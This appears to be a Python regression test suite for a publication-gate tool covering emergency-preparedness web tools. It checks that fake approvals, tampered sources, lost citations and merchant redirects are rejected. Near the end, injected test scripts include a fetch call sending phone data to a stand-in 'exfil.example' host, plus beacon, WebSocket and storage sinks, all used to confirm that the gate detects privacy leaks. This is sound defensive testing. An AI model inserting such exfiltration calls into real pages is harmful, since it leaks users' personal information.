"""Synthetic adversarial regression for R185. NEVER independent safety/QD approval."""
import importlib.util
import json
from pathlib import Path
import tempfile
import unittest

GATE_PATH = Path(__file__).resolve().parents[1] / 'tools/r185_tool_custody_gate.py'
spec = importlib.util.spec_from_file_location('r185_tool_custody_gate', GATE_PATH)
gate = importlib.util.module_from_spec(spec)
spec.loader.exec_module(gate)

NAMES = ('family-reunification-card', 'home-fire-escape-worksheet', 'kit-builder',
         'power-outage-planner', 'reunification-plan', 'water-planner')
ORIGINS = ('shelter', 'shelter', 'start', 'shelter', 'start', 'base')
SIZES = (11, 7, 22, 17, 7, 3)
CITATIONS = (16, 11, 106, 26, 7, 7)
UNRESOLVED = (11, 6, 19, 16, 6, 0)

def write(path, content):
    path.parent.mkdir(parents=True, exist_ok=True)
    path.write_text(content, encoding='utf-8')

def json_write(path, data):
    write(path, json.dumps(data, sort_keys=True))

def fixture(root):
    prep = root / 'preparedness'
    rows, pins, summaries, reports, origins = [], {}, [], [], {}
    source_counter = 0
    for name, origin, size, target, unresolved_total in zip(NAMES, ORIGINS, SIZES, CITATIONS, UNRESOLVED):
        origins[name] = origin
        own = {}
        tokens = []
        unresolved = []
        for n in range(size):
            sid = f'src-{source_counter:03d}'
            source_counter += 1
            own[sid] = f'Original author interpretation for {sid}'
            occurrences = target // size + (1 if n < target % size else 0)
            tokens.extend(['{{cite:' + sid + '}}'] * occurrences)
            pending = n < unresolved_total
            if pending: unresolved.append(sid)
            rows.append(dict(tool=name, source_id=sid, citation_occurrences=occurrences,
                current_origin='base', candidate_origin=origin,
                effective_source_origin=origin, currently_resolvable=not pending,
                literal_url='https://example.org/source/' + sid,
                source_supports=f'Source scope {sid}', author_specific_use=own[sid],
                review_decision='PENDING', reviewer=None, human_link_check_recorded=False,
                human_source_scope_adjudicated=False, medical_safety_approved=False))
        meta = dict(slug=name, kind='tool', section='field-tools', track='modern',
            status={'publish':'draft','editorial':'drafted'}, safety_review={'state':'pending'},
            source_use=own)
        body = '<p>' + ''.join(tokens) + '</p>'
        for kind, value in (('meta.json', json.dumps(meta,sort_keys=True)), ('body.html',body)):
            rel = f'content/tools/{name}.{kind}'
            write(prep/rel,value)
            pins[rel]=gate.git_blob(value.encode('utf-8'))
        summaries.append(dict(tool=name,current_origin='base',candidate_origin=origin,
            unique_cited_sources=size,citation_occurrences=target,currently_unresolved_source_ids=unresolved,
            publication_allowed=False))
        reports.append({'slug':name,'canonical':gate.BASE+'field-tools/'+name+'/',
                        'sources':[f'src-{source_counter-size+n:03d}' for n in range(size)]})
        content = ('<!-- wp:html -->\n<div data-slug="'+name+'">'
            'Draft: not public Independent safety/source and QD verification pending '
            '<section class="pa-sources"></section><section class="pa-review"></section>'
            + '<sup class="pa-cite">[1]</sup>'*len(tokens))
        if name == 'family-reunification-card':
            content += ('<p>A printed card can be lost</p><input id="rc-minimal">'
                        '<button id="rc-reset">Reset</button><script>rcModel(fields(), minimal)</script>')
        write(prep/f'build/wp/{name}.html',content+'</div>\n<!-- /wp:html -->')
    for rel in ('sources/crosswalk.json','sources/fragments/shelter.json',
                'sources/fragments/start.json','sources/register.json'):
        write(prep/rel,'{}')
        pins[rel]=gate.git_blob(b'{}')
    doc = {'schema':'FV-PREP-R149-TOOL-CLAIM-CUSTODY-1',
           'status':'CANDIDATE_ONLY_HUMAN_SOURCE_REVIEW_REQUIRED',
           'candidate_tool_origins':origins,'tool_summaries':summaries,
           'source_use_rows':rows,'source_use_row_count':67,
           'currently_unresolved_source_ids':58,'human_link_checked_rows':0,
           'source_scope_human_review':'PENDING','independent_qd':'NOT_APPROVED',
           'publication_allowed':False,'payment_offer_verified':False,
           'customer_conversion_verified':False,'immutable_git_blob_sha1':pins}
    json_write(prep/'docs/r149/tool-source-use-review-docket.json',doc)
    json_write(prep/'taxonomy.json',{'tools':[{'slug':n} for n in NAMES]})
    json_write(prep/'build/build-report.json',{'articles':reports,'release_evidence':{
        'state':'HOLD','independent_qa_verified':False,'wordpress_publication_performed':False,
        'article_published':0}})
    return prep

class R185Tests(unittest.TestCase):
    @classmethod
    def setUpClass(cls):
        cls.tmp=tempfile.TemporaryDirectory()
        cls.root=Path(cls.tmp.name)
        cls.prep=fixture(cls.root)
    @classmethod
    def tearDownClass(cls): cls.tmp.cleanup()

    def assert_reject(self, expected=None):
        errors,receipt=gate.check(self.root)
        self.assertTrue(errors,receipt)
        self.assertEqual(receipt['state'],'INVALID_HARD_HOLD')
        self.assertFalse(receipt['merchant_offer_verified'])
        if expected:
            self.assertTrue(any(expected in x for x in errors),errors)

    def json_mutation(self, path, modifier, expected=None):
        file=self.prep/path; original=file.read_bytes()
        try:
            data=json.loads(original)
            modifier(data)
            json_write(file,data)
            self.assert_reject(expected)
        finally: file.write_bytes(original)

    def text_mutation(self,path,old,new,expected=None):
        file=self.prep/path; original=file.read_bytes()
        try:
            text=original.decode()
            self.assertIn(old,text)
            write(file,text.replace(old,new,1))
            self.assert_reject(expected)
        finally:file.write_bytes(original)

    def test_clean_hold_not_approval(self):
        errors,r=gate.check(self.root)
        self.assertEqual(errors,[])
        self.assertEqual(r['state'],'DRAFT_HARD_HOLD')
        self.assertEqual((r['tool_count'],r['source_rows'],r['citation_occurrences']),(6,67,173))
    def test_cli_exit_two(self):
        self.assertEqual(gate.main(['--repo',str(self.root)]),2)
    def test_missing_root(self):
        self.assertEqual(gate.check(self.root/'absent')[1]['state'],'INVALID_HARD_HOLD')
    def test_fake_independent_qd(self):
        self.json_mutation('docs/r149/tool-source-use-review-docket.json',
            lambda d:d.update(independent_qd='APPROVED'),'QD')
    def test_fake_purchase(self):
        self.json_mutation('docs/r149/tool-source-use-review-docket.json',
            lambda d:d.update(customer_conversion_verified=True),'customer_conversion')
    def test_fake_offer(self):
        self.json_mutation('docs/r149/tool-source-use-review-docket.json',
            lambda d:d.update(payment_offer_verified=True),'payment_offer')
    def test_fake_publication(self):
        self.json_mutation('docs/r149/tool-source-use-review-docket.json',
            lambda d:d.update(publication_allowed=True),'publication_allowed')
    def test_false_reviewed(self):
        self.json_mutation('docs/r149/tool-source-use-review-docket.json',
            lambda d:d.update(source_scope_human_review='RESOLVED'),'source review')
    def test_source_count_reclassified(self):
        self.json_mutation('docs/r149/tool-source-use-review-docket.json',
            lambda d:d.update(currently_unresolved_source_ids=0),'unresolved')
    def test_duplicate_docket_row(self):
        self.json_mutation('docs/r149/tool-source-use-review-docket.json',
            lambda d:d['source_use_rows'].append(d['source_use_rows'][0].copy()),'source-use row')
    def test_extra_duplicate_report(self):
        self.json_mutation('build/build-report.json',
            lambda d:d['articles'].append(d['articles'][0].copy()),'duplicate report')
    def test_report_false_approval(self):
        self.json_mutation('build/build-report.json',
            lambda d:d['release_evidence'].update(independent_qa_verified=True),'QD')
    def test_redirect_to_merchant(self):
        self.json_mutation('build/build-report.json',
            lambda d:d['articles'][0].update(canonical='https://merchant.example/'), 'canonical')
    def test_missing_privacy_notice(self):
        self.text_mutation('build/wp/family-reunification-card.html',
            'A printed card can be lost','Personal information is safe','privacy warning')
    def test_missing_privacy_minimal(self):
        self.text_mutation('build/wp/family-reunification-card.html',
            'rcModel(fields(), minimal)','rcModel(fields(), false)','minimal')
    def test_tampered_source_registry(self):
        self.text_mutation('sources/register.json','{}','{"source":"fake"}','Git blob')
    def test_fake_reviewed_card(self):
        self.text_mutation('build/wp/family-reunification-card.html',
            '<div data-slug=', '<div data-verify="reviewed" data-slug=', 'unsafe approval')
    def test_source_url_mutation(self):
        self.json_mutation('docs/r149/tool-source-use-review-docket.json',
            lambda d:d['source_use_rows'][0].update(literal_url='http://example.org'),'literal')


def make_source_mutation(n):
    def test(self):
        self.json_mutation('docs/r149/tool-source-use-review-docket.json',
            lambda d:d['source_use_rows'][n].update(human_source_scope_adjudicated=True),
            'source/medical')
    return test

def make_tool_citation_mutation(n):
    def test(self):
        name=NAMES[n]
        self.text_mutation(f'build/wp/{name}.html','class="pa-cite"','class="pa-citation-lost"', 'citation')
    return test

def make_privacy_sink_mutation(pattern,label):
    def test(self):
        target='build/wp/family-reunification-card.html'
        self.text_mutation(target,'<script>rcModel(fields(), minimal)</script>',
            '<script>rcModel(fields(), minimal);'+pattern+'</script>', 'privacy sink')
    return test

for i in range(67):
    setattr(R185Tests,f'test_source_{i:02d}_unreviewed_gate',make_source_mutation(i))
for i in range(6):
    setattr(R185Tests,f'test_tool_{i:02d}_citation_loss',make_tool_citation_mutation(i))
for i,(mutation,label) in enumerate([
    ('fetch("https://exfil.example/?phone=" + f)','fetch'),
    ('new XMLHttpRequest()','xhr'), ('navigator.sendBeacon("/s", f)','beacon'),
    ('localStorage.setItem("f", f)','local'), ('sessionStorage.setItem("f", f)','session'),
    ('new WebSocket("wss://foo")','websocket'), ('indexedDB.open("people")','indexeddb'),
    ('new EventSource("/data")','eventsource')]):
    setattr(R185Tests,f'test_sensitive_sink_{i:02d}_{label}',make_privacy_sink_mutation(mutation,label))

if __name__=='__main__':unittest.main()
